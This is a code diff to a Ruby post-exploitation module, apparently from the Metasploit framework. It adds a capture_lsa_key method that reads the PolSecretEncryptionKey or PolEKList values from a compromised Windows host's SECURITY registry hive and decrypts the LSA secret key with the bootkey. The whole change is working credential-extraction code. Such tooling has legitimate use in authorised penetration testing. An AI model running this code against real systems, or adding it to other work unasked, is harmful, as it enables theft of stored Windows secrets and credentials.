@@ -151,4 +151,48 @@ module Msf::Post::Windows::Priv
     return key.pack("C*")
   end
 
+  #
+  # Returns the LSA key upon input of the unscrambled bootkey
+  #
+  def capture_lsa_key(bootkey)
+    begin
+      vprint_status("Getting PolSecretEncryptionKey...")
+      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\PolSecretEncryptionKey", KEY_READ)
+      pol = ok.query_value("").data
+      vprint_status("Got PolSecretEncryptionKey: #{pol.unpack("H*")[0]}")
+      ok.close
+      print_status("XP or below client")
+      @vista = 0
+    rescue
+      vprint_status("Trying 'V72' style...")
+      vprint_status("Getting PolEKList...")
+      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\PolEKList", KEY_READ)
+      pol = ok.query_value("").data
+      vprint_good("Pol: #{pol.unpack("H*")[0]}")
+      ok.close
+      print_status("Vista or above client")
+      @vista = 1
+    end
+
+    if( @vista == 1 )
+      lsakey = decrypt_lsa(pol, bootkey)
+      lsakey = lsakey[68,32]
+      vprint_good(lsakey.unpack("H*")[0])
+    else
+      md5x = Digest::MD5.new()
+      md5x << bootkey
+      (1..1000).each do
+        md5x << pol[60,16]
+      end
+
+      rc4 = OpenSSL::Cipher::Cipher.new("rc4")
+      rc4.key = md5x.digest
+      lsakey  = rc4.update(pol[12,48])
+      lsakey << rc4.final
+      lsakey = lsakey[0x10..0x1F]
+    end
+    return lsakey
+  end
+
+
 end
